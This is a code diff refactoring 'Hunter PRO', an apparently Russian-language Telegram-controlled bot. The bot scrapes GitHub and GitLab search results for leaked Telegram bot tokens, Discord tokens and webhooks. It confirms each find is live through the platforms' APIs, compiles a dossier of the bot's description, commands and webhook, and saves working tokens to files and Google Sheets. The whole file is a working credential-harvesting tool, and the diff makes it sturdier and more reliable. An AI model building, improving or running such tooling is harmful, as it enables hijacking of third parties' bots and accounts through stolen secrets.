@@ -7,12 +7,10 @@ import time
 import json
 import base64
 import random
-import socket
-import traceback
-import http.client
 import urllib.parse
 import threading
-from typing import List, Dict, Optional, Tuple, Any
+import traceback
+from typing import List, Dict, Optional, Tuple, Any, Set
 from datetime import datetime
 from collections import Counter
 
@@ -58,9 +56,10 @@ SEEN_DB_FILE = os.getenv("SEEN_DB_FILE", "seen_tokens.txt")
 LIVE_DB_FILE = os.getenv("LIVE_DB_FILE", "live_tokens.json")
 
 MAX_LOG_LINES = 15
-TARGET_CONN_TIMEOUT = 1.3
-TARGET_READ_TIMEOUT = 1.7
-DOSSIER_TIMEOUT = 1.1
+TARGET_CONN_TIMEOUT = 2.0
+TARGET_READ_TIMEOUT = 3.0
+DOSSIER_CONN_TIMEOUT = 1.5
+DOSSIER_READ_TIMEOUT = 2.0
 
 if not CONTROL_BOT_TOKEN:
     raise RuntimeError("Не задана переменная окружения CONTROL_BOT_TOKEN!")
@@ -68,13 +67,24 @@ if not CONTROL_BOT_TOKEN:
 bot = telebot.TeleBot(CONTROL_BOT_TOKEN, threaded=True, num_threads=6)
 app = Flask(__name__)
 
-# Сессия для GitHub / GitLab API (с короткими таймаутами и без бесконечных ретраев)
-api_session = requests.Session()
-_adapter = HTTPAdapter(pool_connections=12, pool_maxsize=12, max_retries=0)
-api_session.mount("https://", _adapter)
-api_session.mount("http://", _adapter)
-api_session.headers.update({
-    "User-Agent": "HunterPRO-Scanner/8.0 (+https://github.com)"
+# Отдельная сессия для проверки целей (Telegram / Discord / Webhook)
+verifier_session = requests.Session()
+_v_adapter = HTTPAdapter(pool_connections=16, pool_maxsize=16, max_retries=0)
+verifier_session.mount("https://", _v_adapter)
+verifier_session.mount("http://", _v_adapter)
+verifier_session.headers.update({
+    "User-Agent": "HunterPRO-Verifier/8.1",
+    "Accept": "application/json",
+})
+
+# Отдельная сессия для поиска по GitHub / GitLab API
+search_session = requests.Session()
+_s_adapter = HTTPAdapter(pool_connections=12, pool_maxsize=12, max_retries=0)
+search_session.mount("https://", _s_adapter)
+search_session.mount("http://", _s_adapter)
+search_session.headers.update({
+    "User-Agent": "HunterPRO-Scanner/8.1 (+https://github.com)",
+    "Accept": "application/json",
 })
 
 
@@ -227,7 +237,7 @@ search_state: Dict[str, Any] = {
 }
 
 awaiting_manual_check: Dict[int, float] = {}
-sent_critical_alerts: set = set()
+sent_critical_alerts: Set[str] = set()
 
 _cached_worksheet = None
 _sheets_init_attempted = False
@@ -455,7 +465,7 @@ def save_to_google_sheets(data: Dict[str, Any]) -> bool:
 # =====================================================================
 # 6. ЛОКАЛЬНАЯ БАЗА ДАННЫХ (seen_tokens.txt и live_tokens.json)
 # =====================================================================
-def load_seen_tokens() -> set:
+def load_seen_tokens() -> Set[str]:
     with db_lock:
         if not os.path.exists(SEEN_DB_FILE):
             return set()
@@ -534,96 +544,76 @@ def save_live_token(token_data: Dict[str, Any]) -> bool:
 
 
 # =====================================================================
-# 7. ПРОВЕРКА ТОКЕНОВ И ВЕБХУКОВ (ЖЁСТКИЕ ТАЙМАУТЫ + ПОЛНОЕ ДОСЬЕ)
+# 7. ПРОВЕРКА ТОКЕНОВ И ВЕБХУКОВ (БЕЗОПАСНЫЙ HTTP + ПОЛНОЕ ДОСЬЕ)
 # =====================================================================
-def _http_get_json_strict(
+def _http_get_json(
     full_url: str,
     headers: Optional[Dict[str, str]] = None,
     connect_timeout: float = TARGET_CONN_TIMEOUT,
     read_timeout: float = TARGET_READ_TIMEOUT,
 ) -> Tuple[int, Optional[Dict[str, Any]], Optional[str]]:
     parsed = urllib.parse.urlparse(full_url)
-    host = parsed.hostname
-    if not host:
+    if not parsed.scheme or not parsed.hostname:
         return 0, None, "bad url"
 
-    port = parsed.port or 443
-    path = parsed.path or "/"
-    if parsed.query:
-        path = f"{path}?{parsed.query}"
-
     req_headers = {
-        "Host": host,
-        "User-Agent": "HunterPRO-Verifier/8.0",
+        "User-Agent": "HunterPRO-Verifier/8.1",
         "Accept": "application/json",
-        "Connection": "close",
     }
     if headers:
         req_headers.update(headers)
 
-    raw_sock: Optional[socket.socket] = None
-    conn: Optional[http.client.HTTPSConnection] = None
     try:
-        raw_sock = socket.create_connection((host, port), timeout=connect_timeout)
-        raw_sock.settimeout(read_timeout)
+        resp = verifier_session.get(
+            full_url,
+            headers=req_headers,
+            timeout=(connect_timeout, read_timeout),
+            allow_redirects=False,
+        )
+        status = resp.status_code
+        raw_text = resp.content[:65536].decode("utf-8", errors="ignore")
+        resp.close()
 
-        conn = http.client.HTTPSConnection(host, port=port, timeout=read_timeout)
-        conn.sock = raw_sock
-        conn.request("GET", path, headers=req_headers)
-        if conn.sock is not None:
-            conn.sock.settimeout(read_timeout)
-
-        resp = conn.getresponse()
-        if resp.fp is not None and getattr(resp.fp, "fp", None) is not None:
-            try:
-                resp.fp.fp.settimeout(read_timeout)
-            except Exception:
-                pass
-
-        status = resp.status
-        body = resp.read(32768).decode("utf-8", errors="ignore")
         if status != 200:
             return status, None, f"HTTP {status}"
+
         try:
-            return 200, json.loads(body), None
+            data = json.loads(raw_text)
+            if isinstance(data, dict):
+                return 200, data, None
+            return 200, None, "non-dict json"
         except Exception:
             return 200, None, "bad json"
-    except (socket.timeout, TimeoutError):
+
+    except requests.Timeout:
         return 0, None, "таймаут"
-    except ConnectionRefusedError:
-        return 0, None, "отказ соединения"
-    except http.client.HTTPException as h_exc:
-        return 0, None, f"HTTPerr:{str(h_exc)[:15]}"
-    except OSError as os_exc:
-        err_msg = os_exc.strerror or str(os_exc)
-        return 0, None, f"сеть:{err_msg[:18]}"
+    except requests.ConnectionError as c_exc:
+        short_c = str(c_exc).splitlines()[0][:24] if str(c_exc) else "сеть"
+        return 0, None, f"сеть:{short_c}"
+    except requests.RequestException as r_exc:
+        short_r = str(r_exc).splitlines()[0][:24] if str(r_exc) else "req_err"
+        return 0, None, f"req:{short_r}"
     except Exception as exc:
         traceback.print_exc()
-        return 0, None, f"err:{str(exc)[:16]}"
-    finally:
-        if conn is not None:
-            try:
-                conn.close()
-            except Exception:
-                pass
-        elif raw_sock is not None:
-            try:
-                raw_sock.close()
-            except Exception:
-                pass
+        return 0, None, f"err:{str(exc)[:20]}"
 
 
 def check_telegram_token(token: str) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
-    code, payload, err = _http_get_json_strict(
+    code, payload, err = _http_get_json(
         f"https://api.telegram.org/bot{token}/getMe",
         connect_timeout=TARGET_CONN_TIMEOUT,
         read_timeout=TARGET_READ_TIMEOUT,
     )
+    if code == 429:
+        return False, None, False, "", "rate limit (429)"
+    if code == 401 or code == 404:
+        return False, None, False, "", f"невалидный ({code})"
     if code != 200 or not isinstance(payload, dict):
         return False, None, False, "", err or f"HTTP {code}"
 
     if not (payload.get("ok") and isinstance(payload.get("result"), dict)):
-        return False, None, False, "", "невалидный"
+        desc = str(payload.get("description") or "невалидный")[:30]
+        return False, None, False, "", desc
 
     result = payload["result"]
     username = result.get("username") or result.get("first_name") or "UnknownBot"
@@ -637,46 +627,55 @@ def check_telegram_token(token: str) -> Tuple[bool, Optional[str], bool, str, Op
     cmds_text = "Нет команд"
     wh_text = "Webhook не задан"
 
-    _, d_data, _ = _http_get_json_strict(
-        f"https://api.telegram.org/bot{token}/getMyDescription",
-        connect_timeout=0.8,
-        read_timeout=DOSSIER_TIMEOUT,
-    )
-    if isinstance(d_data, dict) and isinstance(d_data.get("result"), dict):
-        raw_desc = d_data["result"].get("description")
-        if raw_desc:
-            desc_text = html.escape(str(raw_desc).strip()[:200])
+    try:
+        _, d_data, _ = _http_get_json(
+            f"https://api.telegram.org/bot{token}/getMyDescription",
+            connect_timeout=DOSSIER_CONN_TIMEOUT,
+            read_timeout=DOSSIER_READ_TIMEOUT,
+        )
+        if isinstance(d_data, dict) and isinstance(d_data.get("result"), dict):
+            raw_desc = d_data["result"].get("description")
+            if raw_desc:
+                desc_text = html.escape(str(raw_desc).strip()[:200])
+    except Exception as d_exc:
+        add_log(f"⚠️ Досье description не получено: {str(d_exc)[:25]}")
 
-    _, c_data, _ = _http_get_json_strict(
-        f"https://api.telegram.org/bot{token}/getMyCommands",
-        connect_timeout=0.8,
-        read_timeout=DOSSIER_TIMEOUT,
-    )
-    if isinstance(c_data, dict) and isinstance(c_data.get("result"), list):
-        parsed = [
-            html.escape(f"/{c.get('command', '')}")
-            for c in c_data["result"][:10]
-            if isinstance(c, dict) and c.get("command")
-        ]
-        if parsed:
-            cmds_text = ", ".join(parsed)
+    try:
+        _, c_data, _ = _http_get_json(
+            f"https://api.telegram.org/bot{token}/getMyCommands",
+            connect_timeout=DOSSIER_CONN_TIMEOUT,
+            read_timeout=DOSSIER_READ_TIMEOUT,
+        )
+        if isinstance(c_data, dict) and isinstance(c_data.get("result"), list):
+            parsed = [
+                html.escape(f"/{c.get('command', '')}")
+                for c in c_data["result"][:10]
+                if isinstance(c, dict) and c.get("command")
+            ]
+            if parsed:
+                cmds_text = ", ".join(parsed)
+    except Exception as c_exc:
+        add_log(f"⚠️ Досье commands не получено: {str(c_exc)[:25]}")
 
-    _, wh_data, _ = _http_get_json_strict(
-        f"https://api.telegram.org/bot{token}/getWebhookInfo",
-        connect_timeout=0.8,
-        read_timeout=DOSSIER_TIMEOUT,
-    )
-    if isinstance(wh_data, dict) and isinstance(wh_data.get("result"), dict):
-        wh_res = wh_data["result"]
-        wh_url = str(wh_res.get("url") or "").strip()
-        pending = int(wh_res.get("pending_update_count") or 0)
-        last_err = str(wh_res.get("last_error_message") or "").strip()
-        if wh_url:
-            wh_text = f"<code>{html.escape(wh_url[:90])}</code> (очередь: {pending})"
-            if last_err:
-                wh_text += f"\n⚠️ <b>Ошибка WH:</b> <code>{html.escape(last_err[:90])}</code>"
-        else:
-            wh_text = f"Не задан (очередь: {pending})"
+    try:
+        _, wh_data, _ = _http_get_json(
+            f"https://api.telegram.org/bot{token}/getWebhookInfo",
+            connect_timeout=DOSSIER_CONN_TIMEOUT,
+            read_timeout=DOSSIER_READ_TIMEOUT,
+        )
+        if isinstance(wh_data, dict) and isinstance(wh_data.get("result"), dict):
+            wh_res = wh_data["result"]
+            wh_url = str(wh_res.get("url") or "").strip()
+            pending = int(wh_res.get("pending_update_count") or 0)
+            last_err = str(wh_res.get("last_error_message") or "").strip()
+            if wh_url:
+                wh_text = f"<code>{html.escape(wh_url[:90])}</code> (очередь: {pending})"
+                if last_err:
+                    wh_text += f"\n⚠️ <b>Ошибка WH:</b> <code>{html.escape(last_err[:90])}</code>"
+            else:
+                wh_text = f"Не задан (очередь: {pending})"
+    except Exception as w_exc:
+        add_log(f"⚠️ Досье webhook не получено: {str(w_exc)[:25]}")
 
     dossier = (
         f"📝 <b>Био:</b> {desc_text}\n"
@@ -687,7 +686,7 @@ def check_telegram_token(token: str) -> Tuple[bool, Optional[str], bool, str, Op
 
 
 def check_discord_token(token: str) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
-    code, data, err = _http_get_json_strict(
+    code, data, err = _http_get_json(
         "https://discord.com/api/v10/users/@me",
         headers={"Authorization": f"Bot {token}"},
         connect_timeout=TARGET_CONN_TIMEOUT,
@@ -707,7 +706,7 @@ def check_discord_token(token: str) -> Tuple[bool, Optional[str], bool, str, Opt
 
 
 def check_discord_webhook(webhook_url: str) -> Tuple[bool, Optional[str], bool, str, Optional[str]]:
-    code, data, err = _http_get_json_strict(
+    code, data, err = _http_get_json(
         webhook_url,
         connect_timeout=TARGET_CONN_TIMEOUT,
         read_timeout=TARGET_READ_TIMEOUT,
@@ -826,14 +825,14 @@ def extract_findings_from_text(
     text: str,
     repo_full_name: str,
     html_url: str,
-    seen_tokens: set,
+    seen_tokens: Set[str],
     hunt_mode: str = "all",
 ) -> List[Dict[str, str]]:
     if not text:
         return []
 
     found: List[Dict[str, str]] = []
-    seen_in_batch = set()
+    seen_in_batch: Set[str] = set()
 
     patterns = [
         ("Telegram", TG_TOKEN_RE),
@@ -899,12 +898,13 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
 
     with state_lock:
         hunt_mode = search_state["hunt_mode"]
+        cur_status = search_state["status_text"]
 
     findings: List[Dict[str, str]] = []
     seen_tokens = load_seen_tokens()
 
     query = _build_search_query(hunt_mode)
-    set_status(search_state["status_text"], f"GitHub [{HUNT_MODES.get(hunt_mode, hunt_mode)}]: {query}")
+    set_status(cur_status, f"GitHub [{HUNT_MODES.get(hunt_mode, hunt_mode)}]: {query}")
 
     headers = {
         "Accept": "application/vnd.github.text-match+json",
@@ -920,11 +920,11 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
     }
 
     try:
-        resp = api_session.get(
+        resp = search_session.get(
             "https://api.github.com/search/code",
             headers=headers,
             params=params,
-            timeout=(2.0, 5.0),
+            timeout=(2.5, 6.0),
         )
 
         if resp.status_code == 401:
@@ -951,16 +951,20 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
 
         resp.raise_for_status()
         reset_critical_alert("github_401")
-        items = resp.json().get("items") or []
+        payload = resp.json()
+        items = payload.get("items") or [] if isinstance(payload, dict) else []
 
         for item in items:
+            if not isinstance(item, dict):
+                continue
             repo_name = (item.get("repository") or {}).get("full_name") or "unknown/repo"
             html_url = item.get("html_url") or "https://github.com"
             fragments = []
             for m in item.get("text_matches") or []:
-                frag = m.get("fragment")
-                if frag:
-                    fragments.append(frag)
+                if isinstance(m, dict):
+                    frag = m.get("fragment")
+                    if frag:
+                        fragments.append(str(frag))
 
             combined = "\n".join(fragments)
             extracted = extract_findings_from_text(
@@ -992,6 +996,7 @@ def search_gitlab() -> List[Dict[str, str]]:
 
     with state_lock:
         hunt_mode = search_state["hunt_mode"]
+        cur_status = search_state["status_text"]
 
     if hunt_mode == "tg":
         query = random.choice(["BOT_TOKEN", "TELEGRAM_BOT_TOKEN", "api.telegram.org/bot"])
@@ -1002,17 +1007,17 @@ def search_gitlab() -> List[Dict[str, str]]:
 
     findings: List[Dict[str, str]] = []
     seen_tokens = load_seen_tokens()
-    set_status(search_state["status_text"], f"GitLab: {query}")
+    set_status(cur_status, f"GitLab: {query}")
 
     headers = {"PRIVATE-TOKEN": GITLAB_TOKEN}
     params = {"scope": "blobs", "search": query, "per_page": 8}
 
     try:
-        resp = api_session.get(
+        resp = search_session.get(
             "https://gitlab.com/api/v4/search",
             headers=headers,
             params=params,
-            timeout=(2.0, 4.0),
+            timeout=(2.5, 5.0),
         )
         if resp.status_code == 401:
             notify_critical_error(
@@ -1030,6 +1035,8 @@ def search_gitlab() -> List[Dict[str, str]]:
             return []
 
         for blob in blobs[:5]:
+            if not isinstance(blob, dict):
+                continue
             with state_lock:
                 if search_state["stop_requested"]:
                     break
@@ -1041,17 +1048,17 @@ def search_gitlab() -> List[Dict[str, str]]:
             if not project_id or not file_path:
                 continue
 
-            encoded_path = urllib.parse.quote(file_path, safe="")
+            encoded_path = urllib.parse.quote(str(file_path), safe="")
             raw_url = (
                 f"https://gitlab.com/api/v4/projects/{project_id}/repository/files/"
                 f"{encoded_path}/raw"
             )
             try:
-                raw_resp = api_session.get(
+                raw_resp = search_session.get(
                     raw_url,
                     headers=headers,
                     params={"ref": ref},
-                    timeout=(1.5, 2.0),
+                    timeout=(2.0, 3.0),
                 )
                 if raw_resp.status_code != 200:
                     continue
@@ -1442,7 +1449,7 @@ def send_welcome(message: types.Message):
     cur_hunt = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])
 
     welcome_text = (
-        "👋 <b>Пульт Hunter PRO v8.0</b>\n"
+        "👋 <b>Пульт Hunter PRO v8.1</b>\n"
         "Сканер токенов и вебхуков с ручной проверкой, досье (вкл. webhook), режимами охоты, фильтрами и экспортом.\n\n"
         f"☁️ Google Sheets: <code>{html.escape(sheets_status)}</code>\n"
         f"🎯 Охота: <code>{html.escape(cur_hunt)}</code>\n"
